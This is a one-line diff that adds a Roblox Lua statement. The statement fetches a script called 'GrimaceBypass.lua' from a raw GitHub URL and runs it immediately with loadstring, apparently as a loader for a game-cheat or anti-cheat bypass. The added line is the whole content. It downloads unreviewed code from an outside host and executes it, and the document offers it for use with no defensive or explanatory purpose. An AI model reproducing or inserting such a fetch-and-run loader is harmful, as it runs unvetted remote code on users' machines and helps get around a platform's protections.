@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gussywussylol/bypassedgrimace/main/GrimaceBypass.lua", true))()
